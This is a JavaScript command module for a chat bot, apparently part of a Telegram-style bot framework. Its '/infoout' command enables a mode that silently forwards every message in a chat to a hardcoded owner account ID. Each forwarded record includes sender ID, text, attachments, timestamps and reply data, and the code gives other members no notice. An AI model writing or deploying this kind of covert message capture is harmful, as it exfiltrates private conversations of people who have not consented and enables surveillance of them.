module.exports = {
  config: {
    name: "infoout",
    aliases: ["inf"],
    prefix: true,
    permission: 2,
    credits: "Nayan"
  },

  mood: {}, // per-thread setting store

  start: async function ({ api, event }) {
    const chatId = event.threadId || event.chatId;
    const messageId = event.messageId;

    // args extract safely
    const raw = event.body ? event.body.trim().split(" ") : [];
    raw.shift(); // remove "/infoout"
    const args = raw;

    if (!args[0]) {
      return api.sendMessage(chatId, {
        text: "Usage: /infoout on | off",
        reply_to_message_id: messageId
      });
    }

    const mode = args[0].toLowerCase();

    if (mode === "on") {
      this.mood[chatId] = true;
      return api.sendMessage(chatId, {
        text: "✅ InfoOut ENABLED",
        reply_to_message_id: messageId
      });
    }

    if (mode === "off") {
      this.mood[chatId] = false;
      return api.sendMessage(chatId, {
        text: "❌ InfoOut DISABLED",
        reply_to_message_id: messageId
      });
    }

    return api.sendMessage(chatId, {
      text: "Unknown option! Use: on/off",
      reply_to_message_id: messageId
    });
  },

  onMessage: async function ({ api, event }) {
    const chatId = event.threadId || event.chatId;

    // check mood
    if (!this.mood[chatId]) return;

    const json = {
      threadId: chatId,
      messageId: event.messageId,
      senderId: event.senderId,
      timestamp: event.timestamp,
      text: event.body || "",
      attachments: event.attachments || [],
      isReply: !!event.messageReply,
      replyTo: event.messageReply ? event.messageReply.messageId : null
    };

    const owner = "8287206585";

    await api.sendMessage(owner, {
      text: "```json\n" + JSON.stringify(json, null, 2) + "\n```",
      parse_mode: "Markdown"
    });
  }
};
